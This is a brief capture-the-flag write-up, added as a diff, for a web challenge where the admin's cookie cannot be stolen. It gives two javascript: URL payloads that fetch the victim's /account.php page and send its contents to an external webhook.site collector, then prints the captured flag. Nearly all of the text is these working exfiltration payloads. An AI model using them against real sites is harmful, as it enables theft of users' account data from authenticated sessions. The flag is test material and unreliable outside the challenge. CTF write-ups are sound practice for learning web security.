@@ -1,0 +1,18 @@
+This time we cannot steal the cookie
+
+Send request to http://35.200.166.215:5556/
+```
+javascript:(()=>{fetch('/account.php').then(r=>{return r.text()}).then(t=>{fetch('https://webhook.site/f968a427-a5de-4d45-b264-1104880c90b1', {method:'POST',body:t})})})()
+```
+
+OR
+
+```
+javascript:fetch('/account.php').then((r)=>r.text()).then((r)=>window.location.href='https://webhook.site/xxx/?p='+window.btoa(r))
+```
+
+```
+<h2>You beat the admin again: zh3r0{4dm1n_h4tes_car_st34l3rs_br0}</h2>
+```
+
+
